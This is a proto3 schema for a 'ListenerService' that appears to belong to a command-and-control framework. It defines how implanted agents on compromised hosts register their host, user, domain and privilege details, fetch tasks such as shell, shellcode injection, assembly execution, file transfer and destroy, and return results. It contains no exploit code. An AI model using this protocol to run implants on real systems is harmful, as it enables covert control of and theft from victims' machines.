syntax = "proto3";

package listener.v1;

import "google/protobuf/wrappers.proto";
import "common/v1/common.proto";

service ListenerService {
  // Update listener's information. Can be used to set location and meta infromation
  // of where listener works
  rpc UpdateListener( UpdateListenerRequest ) returns ( UpdateListenerResponse );

  // Register new agent with collected information from compromised OS
  rpc RegisterAgent( RegisterAgentRequest ) returns ( RegisterAgentResponse );

  // Get task for agent from queue
  rpc GetTask( GetTaskRequest ) returns ( GetTaskResponse );

  // Save task's results
  rpc PutResult( PutResultRequest ) returns ( PutResultResponse );
}


// --> UpdateListener
message UpdateListenerRequest {
  // Name of listener. Can be string with maximum length of 256
  google.protobuf.StringValue name = 1;
  // IP address which used to serving agent's server
  google.protobuf.StringValue ip = 2;
  // Port which used to serving agent's server
  google.protobuf.UInt32Value port = 3;
}
message UpdateListenerResponse {}
// <-- UpdateListener


// --> RegisterAgent
message RegisterAgentRequest {
  // [MANDATORY] Agent's id which must be generated by itself on start
  uint32 id = 1;
  // External IP address of agent
  google.protobuf.StringValue ext_ip = 2;
  // Internal IP address of agent
  google.protobuf.StringValue int_ip = 3;
  // [MANDATORY] Operating system type
  uint32 os = 4;
  // Operating system meta information (for example kernel version)
  google.protobuf.StringValue os_meta = 5;
  // Hostname of compromised target
  google.protobuf.StringValue hostname = 6;
  // Username under which agent's process is working
  google.protobuf.StringValue username = 7;
  // Domain name of compromised target
  google.protobuf.StringValue domain = 8;
  // Is process privilged (root, high intergity, etc)
  google.protobuf.BoolValue privileged = 9;
  // Name of agent's process
  google.protobuf.StringValue proc_name = 10;
  // Agent's process ID
  google.protobuf.UInt64Value pid = 11;
  // [MANDATORY] Process architecture
  uint32 arch = 12;
  // Sleep value of agent's process (in seconds)
  google.protobuf.UInt32Value sleep = 13;
  // Jitter value of agent's process (in range 1-99)
  google.protobuf.UInt32Value jitter = 14;
  // [MANDATORY] Binary mask represented supported agent's capabilities
  uint32 caps = 15;
}
message RegisterAgentResponse {}
// <-- RegisterAgent


// --> GetTask
message GetTaskRequest {
  // [MANDATORY] Agent's ID
  uint32 id = 1;
}
message GetTaskResponse {
  // [MANDATORY] Task ID. Generated by server and must be presents
  // to save task's output results
  int64 id = 1;
  // [MANDATORY] Capability value
  uint32 cap = 2;
  // [MANDATORY] Capability's task body
  oneof body {
    common.v1.CapExit exit = 3;
    common.v1.CapSleep sleep = 4;
    common.v1.CapCp cp = 5;
    common.v1.CapCd cd = 6;
    common.v1.CapWhoami whoami = 7;
    common.v1.CapJobkill jobkill = 8;
    common.v1.CapCat cat = 9;
    common.v1.CapExec exec = 10;
    common.v1.CapPwd pwd = 11;
    common.v1.CapJobs jobs = 12;
    common.v1.CapPs ps = 13;
    common.v1.CapLs ls = 14;
    common.v1.CapPause pause = 15;
    common.v1.CapMkdir mkdir = 16;
    common.v1.CapRm rm = 17;
    common.v1.CapShell shell = 18;
    common.v1.CapShellcodeInjection shellcode_injection = 19;
    common.v1.CapUpload upload = 20;
    common.v1.CapKill kill = 21;
    common.v1.CapMv mv = 22;
    common.v1.CapDestroy destroy = 23;
    common.v1.CapExecDetach exec_detach = 24;
    common.v1.CapExecAssembly exec_assembly = 25;
    common.v1.CapPpid ppid = 26;
    common.v1.CapDownload download = 27;
    common.v1.CapReserved23 reserved23 = 28;
    common.v1.CapReserved24 reserved24 = 29;
    common.v1.CapReserved25 reserved25 = 30;
    common.v1.CapReserved26 reserved26 = 31;
    common.v1.CapReserved27 reserved27 = 32;
    common.v1.CapReserved28 reserved28 = 33;
    common.v1.CapReserved29 reserved29 = 34;
    common.v1.CapReserved30 reserved30 = 35;
  };
}
// <-- GetTask


// --> PutResult
message PutResultRequest {
  // [MANDATORY] Agent's ID
  uint32 id = 1;
  // [MANDATORY] Tasks's ID
  int64 tid = 2;
  // Binary output of task's result
  google.protobuf.BytesValue output = 3;
  // [MANDATORY] Tasks's status. May be "IN PROGRESS" in case of long-living task
  uint32 status = 4;
}
message PutResultResponse {}
// <-- PutResult
